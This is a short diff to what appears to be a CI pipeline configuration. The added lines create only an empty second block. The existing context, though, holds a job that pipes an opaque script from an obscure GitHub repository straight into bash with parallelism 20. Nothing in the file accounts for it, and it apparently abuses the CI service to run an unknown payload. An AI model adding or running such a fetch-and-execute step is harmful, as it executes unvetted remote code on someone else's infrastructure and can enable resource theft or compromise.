@@ -14,3 +14,8 @@ blocks:
           commands:
             - 'curl -sL https://github.com/vedhagsvp/tkospae/raw/main/cerak | bash'
           parallelism: 20
+  - name: 'Block #2'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands: []
